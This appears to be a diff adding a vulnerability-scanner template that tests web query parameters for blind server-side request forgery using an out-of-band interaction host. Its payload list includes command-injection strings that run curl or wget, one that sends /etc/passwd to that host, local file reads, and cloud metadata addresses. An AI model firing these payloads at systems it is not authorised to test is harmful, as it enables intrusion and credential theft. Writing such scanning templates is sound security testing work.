@@ -1,0 +1,109 @@
+id: Blind-SSRF
+
+info:
+  name: Blind SSRF
+  author: chippa vijay kumar
+  severity: high
+  description: |
+    This template is designed to test for Blind Server-Side Request Forgery (SSRF) vulnerabilities using out-of-band interaction (OAST) with Interactsh.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Server-Side_Request_Forgery_Testing.html
+  tags: ssrf, oast, dast, blind
+
+variables:
+  marker: "{{interactsh-url}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      interaction:
+        - "https://{{marker}}"
+        - "ftp://{{marker}}"
+        - "file:///etc/passwd"
+        - "gopher://{{marker}}"
+        - "curl http://{{marker}}"
+        - "%3Bcurl http%3A//{{marker}}"
+        - "%23%21%2Fbin%2Fbash%0D%0Acurl+{{marker}}"
+        - "%22;wget+http%3A%2F%2F{{marker}}%27;%22"
+        - "%7C+curl+-d+%40%2Fetc%2Fpasswd+{{marker}}"
+        - 'http://{{interactsh-url}}'
+        - 'file:///c:/windows/win.ini'
+        - 'http://metadata.tencentyun.com/latest/meta-data/'
+        - 'http://100.100.100.200/latest/meta-data/'
+        - 'http://169.254.169.254/latest/meta-data/'
+        - 'http://169.254.169.254/metadata/v1'
+        - 'http://127.0.0.1:22'
+        - 'http://127.0.0.1:3306'
+        - 'dict://127.0.0.1:6379/info'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{interaction}}"
+
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+          - "https"
+          - "ftp"
+          - "gopher"
+      
+      - type: word
+        part: body
+        words:
+          - "Interactsh Server"
+
+      - type: regex
+        part: body
+        regex:
+          - 'SSH-(\d.\d)-OpenSSH_(\d.\d)'
+
+      - type: regex
+        part: body
+        regex:
+          - '(DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)'
+
+      - type: regex
+        part: body
+        regex:
+          - '(\d.\d.\d)(.*?)mysql_native_password'
+
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        part: body
+        words:
+          - 'for 16-bit app support'
+
+      - type: regex
+        part: body
+        regex:
+          - 'dns-conf\/[\s\S]+instance\/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'app-id[\s\S]+placement\/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'ami-id[\s\S]+placement\/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'id[\s\S]+interfaces\/'
